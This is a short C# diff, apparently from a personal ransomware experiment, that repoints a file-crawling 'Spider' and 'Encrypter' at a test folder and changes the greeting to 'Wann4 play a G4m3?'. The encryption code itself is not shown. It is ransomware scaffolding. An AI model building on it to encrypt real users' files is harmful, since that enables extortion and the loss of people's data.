@@ -8,10 +8,10 @@ namespace g0nnaL4ugh
         public static void Main(string[] args)
         {
             Encrypter encrypter = new Encrypter();
-            string[] paths = { "/home/giwiro/CLionProjects" };
+            string[] paths = { "/home/giwiro/Playground/ransomware" };
             Spider spider = new Spider(paths, encrypter);
             spider.BuildNodesFromPath();
-            Console.WriteLine("H3llo W0rld!");
+            Console.WriteLine("Wann4 play a G4m3?");
         }
     }
 }
